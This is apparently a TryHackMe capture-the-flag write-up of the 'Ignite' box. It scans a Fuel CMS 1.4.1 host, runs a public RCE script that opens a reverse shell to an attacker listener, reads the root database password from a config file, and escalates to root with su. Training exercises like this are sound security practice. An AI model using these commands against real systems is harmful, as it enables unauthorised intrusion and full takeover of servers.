
#nmap
└─$ nmap -p- -sV -sC 10.201.79.106 --min-rate=1000 -o nmap0.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 11:30 EDT
Warning: 10.201.79.106 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.201.79.106
Host is up (0.48s latency).
Not shown: 65352 closed tcp ports (reset), 182 filtered tcp ports (no-response)

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/fuel/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.91 seconds
________________________________________________________________________________________________________________________________________________________________________

# The web interface screamd Fuel CMS 1.4 HAHA

 // we do a quick search...
└─$ searchsploit Fuel CMS  
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                        | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                        | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                        | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)       | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)              | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)  | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)                | php/webapps/50884.txt
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

________________________________________________________________________________________________________________________________________________________________________
We find a CVE but hey we find an updated one that gives us a very good shell :
https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated

$cmd : python3 Fuel-Updated.py http://10.201.79.106 <attackerip> 8888
which gives us a shell on the listener

┌──(kali㉿kali)-[~/TryHAckMe/Ignite/Tools/Fuel-1.4.1-RCE-Updated]
└─$ pwncat -l 8888
sh: 0: can't access tty; job control turned off
$ ls
README.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
________________________________________________________________________________________________________________________________________________________________________
// We find the root credentials in the users.db config file

$ cat database.php
<?php
 'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);
____________________________________________________________________________________________________________________________________________________________________________________________________
// to run su on the shell we need a stable one... //

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/fuel/application/config$ 
____________________________________________________________________________________________________________________________________________________________________________________________________
www-data@ubuntu:/var/www/html/fuel/application/config$ su root
su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
                      
